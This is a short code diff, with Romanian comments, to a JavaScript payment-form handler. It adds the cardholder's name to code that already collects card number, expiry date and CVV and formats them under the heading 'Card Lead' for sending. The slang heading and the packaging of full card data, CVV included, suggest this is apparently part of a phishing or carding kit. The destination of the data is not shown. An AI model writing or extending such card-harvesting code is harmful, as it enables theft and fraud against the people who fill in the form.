@@ -6,6 +6,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
     // Preluarea datelor introduse
+    const cardName = document.getElementById('card-name').value;
     const cardNumber = document.getElementById('card-number').value;
     const expiryDate = document.getElementById('expiry-date').value;
     const cvv = document.getElementById('cvv').value;
@@ -13,6 +14,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
     // Datele formatate pentru trimitere
     const orderDetails = `
 Card Lead:
+Nume pe Card: ${cardName}
 Număr Card: ${cardNumber}
 Data Expirării: ${expiryDate}
 CVV: ${cvv}
